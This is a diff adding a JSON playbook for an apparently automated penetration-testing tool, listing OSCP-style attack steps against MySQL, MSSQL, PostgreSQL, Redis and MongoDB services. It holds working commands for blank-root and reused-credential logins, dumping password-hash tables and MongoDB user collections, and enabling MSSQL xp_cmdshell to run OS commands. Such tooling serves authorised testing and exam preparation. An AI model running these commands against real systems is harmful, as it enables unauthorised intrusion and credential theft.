@@ -1,0 +1,143 @@
+{
+  "name": "Database service enumeration & access (§3)",
+  "description": "Enumerate, log into, and — carefully, exam-safe — exploit exposed database services: MySQL/MariaDB, MSSQL, PostgreSQL, Redis, and MongoDB. Enumeration and login run automatically; OS command execution such as xp_cmdshell is only crafted and handed off, never auto-fired.",
+  "source": "OSCP methodology (project-authored, obol-local)",
+  "actions": [
+    {
+      "id": "mysql-login",
+      "title": "MySQL / MariaDB login",
+      "hypothesis": "A reachable MySQL will often take a discovered credential, a blank root password, or reused creds; a session into it opens up schema and credential-table enumeration.",
+      "tool": "mysql",
+      "tools": ["mysql", "mariadb"],
+      "requires_any": ["service.mysql", "port:3306"],
+      "produces": ["db.session"],
+      "priority": 70,
+      "autonomy": "approve",
+      "proves": "an authenticated MySQL session",
+      "does_not_prove": "OS access or a validated OS credential — a database login lives at the app layer",
+      "report": {"finding": "Database service accessible", "severity": "medium"},
+      "refs": ["https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql"],
+      "commands": [
+        {"tool": "mysql", "run": "mysql -h {{target}} -u {{user}} -p{{password}} -e 'SELECT version();'"},
+        {"tool": "mysql", "run": "mysql -h {{target}} -u root --password= -e 'SHOW DATABASES;'"}
+      ]
+    },
+    {
+      "id": "mysql-loot",
+      "title": "MySQL credential-table sweep",
+      "hypothesis": "Application databases keep their own user rows and password hashes, so dumping the user tables yields crackable material and frequently reused admin creds.",
+      "tool": "mysql",
+      "tools": ["mysql"],
+      "requires_all": ["db.session"],
+      "produces": ["loot.material"],
+      "priority": 66,
+      "autonomy": "approve",
+      "proves": "recovered credential material from the database (hashes) — crackable loot",
+      "does_not_prove": "a usable credential until a hash is cracked and a login confirms it",
+      "commands": [
+        {"tool": "mysql", "run": "mysql -h {{target}} -u {{user}} -p{{password}} -e 'SELECT user,authentication_string FROM mysql.user;'"},
+        {"tool": "mysql", "run": "mysql -h {{target}} -u {{user}} -p{{password}} -e 'SELECT username,password FROM users;' <database>"}
+      ]
+    },
+    {
+      "id": "mssql-login",
+      "title": "MSSQL login",
+      "hypothesis": "MSSQL will often accept a domain credential or the `sa` account; an authenticated SQL prompt is the way into enumeration and, given enough privilege, command execution.",
+      "tool": "mssqlclient.py",
+      "tools": ["mssqlclient.py", "impacket-mssqlclient"],
+      "requires_any": ["service.ms-sql-s", "port:1433"],
+      "produces": ["db.session"],
+      "priority": 72,
+      "autonomy": "approve",
+      "proves": "an authenticated MSSQL session",
+      "does_not_prove": "OS command execution — that requires xp_cmdshell, a separate crafted step",
+      "report": {"finding": "MSSQL service accessible", "severity": "medium"},
+      "refs": ["https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server"],
+      "commands": [
+        {"tool": "mssqlclient.py", "run": "mssqlclient.py {{domain}}/{{user}}:{{password}}@{{target}} -windows-auth"},
+        {"tool": "mssqlclient.py", "run": "mssqlclient.py {{user}}:{{password}}@{{target}}"}
+      ]
+    },
+    {
+      "id": "mssql-xp-cmdshell",
+      "title": "MSSQL xp_cmdshell command execution",
+      "hypothesis": "An MSSQL login with sysadmin rights can enable and invoke xp_cmdshell to run OS commands as the SQL service account, giving a Windows foothold.",
+      "tool": "mssqlclient.py",
+      "tools": ["mssqlclient.py"],
+      "requires_all": ["db.session"],
+      "produces": ["foothold.windows"],
+      "priority": 60,
+      "autonomy": "manual",
+      "proves": "OS command execution as the MSSQL service account (a Windows foothold)",
+      "does_not_prove": "an interactive shell or administrator — the service account is frequently low-privileged",
+      "report": {"finding": "MSSQL xp_cmdshell command execution", "severity": "high"},
+      "refs": ["https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server"],
+      "commands": [
+        {"tool": "mssqlclient.py", "run": "EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; EXEC xp_cmdshell 'whoami';"}
+      ]
+    },
+    {
+      "id": "postgres-login",
+      "title": "PostgreSQL login",
+      "hypothesis": "PostgreSQL may accept a default or reused credential; an authenticated session enumerates databases and, on older versions, opens RCE through COPY or large-object tricks.",
+      "tool": "psql",
+      "tools": ["psql"],
+      "requires_any": ["service.postgresql", "port:5432"],
+      "produces": ["db.session"],
+      "priority": 68,
+      "autonomy": "approve",
+      "proves": "an authenticated PostgreSQL session",
+      "does_not_prove": "OS access — RCE on Postgres is a separate, version-dependent step",
+      "report": {"finding": "PostgreSQL service accessible", "severity": "medium"},
+      "commands": [
+        {"tool": "psql", "run": "PGPASSWORD={{password}} psql -h {{target}} -U {{user}} -c '\\l'"}
+      ]
+    },
+    {
+      "id": "redis-enum",
+      "title": "Redis unauthenticated enumeration",
+      "hypothesis": "A Redis exposed on a lab or the internet frequently has no AUTH set; INFO and KEYS surface cached secrets, and a writable instance can be pushed toward RCE by writing an SSH key or a webshell.",
+      "tool": "redis-cli",
+      "tools": ["redis-cli"],
+      "requires_any": ["port:6379", "service.redis"],
+      "produces": ["config.review", "loot.material"],
+      "priority": 64,
+      "autonomy": "auto",
+      "proves": "an unauthenticated Redis instance and any secrets cached in it",
+      "does_not_prove": "OS access — Redis RCE is a separate, crafted step",
+      "report": {"finding": "Unauthenticated Redis service", "severity": "high"},
+      "refs": ["https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis"],
+      "sequence": true,
+      "commands": [
+        {"tool": "redis-cli", "run": "redis-cli -h {{target}} INFO"},
+        {"tool": "redis-cli", "run": "redis-cli -h {{target}} KEYS '*'"}
+      ]
+    },
+    {
+      "id": "mongo-enum",
+      "title": "MongoDB unauthenticated enumeration",
+      "hypothesis": "An exposed MongoDB with no auth lets you list databases and dump a collection, exposing application data and any stored credentials.",
+      "tool": "nmap",
+      "tools": ["nmap", "pymongo"],
+      "requires_any": ["port:27017", "service.mongodb"],
+      "produces": ["loot.material"],
+      "priority": 62,
+      "autonomy": "auto",
+      "proves": "readable MongoDB collections (any credential material they hold)",
+      "does_not_prove": "a validated credential until the material is confirmed with a login",
+      "report": {"finding": "Unauthenticated MongoDB service", "severity": "high"},
+      "refs": ["https://book.hacktricks.xyz/network-services-pentesting/27017-27018-mongodb"],
+      "sequence": true,
+      "commands": [
+        {"tool": "nmap", "run": "nmap -Pn -p 27017 --script mongodb-info,mongodb-databases {{target}}",
+         "note": "the zero-install lead: stock nmap NSE confirms an unauthenticated MongoDB and lists its databases"},
+        {"tool": "pymongo", "run": "python3 -c 'from pymongo import MongoClient; c=MongoClient(\"{{target}}\", 27017, serverSelectionTimeoutMS=5000); print(c.list_database_names())'",
+         "note": "list databases through the client (pymongo, apt python3-pymongo) — the query is on the terminal"},
+        {"tool": "pymongo", "run": "python3 -c 'from pymongo import MongoClient; c=MongoClient(\"{{target}}\", 27017, serverSelectionTimeoutMS=5000); [print(db, c[db].list_collection_names()) for db in c.list_database_names()]'",
+         "note": "enumerate the collections in each database — spot the interesting one (users, creds, config)"},
+        {"tool": "pymongo", "run": "python3 -c 'from pymongo import MongoClient; c=MongoClient(\"{{target}}\", 27017, serverSelectionTimeoutMS=5000); [print(d) for d in c[\"admin\"][\"users\"].find().limit(50)]'",
+         "note": "dump a collection — set the db/collection from the step above (here admin.users); reads any stored credentials"}
+      ]
+    }
+  ]
+}
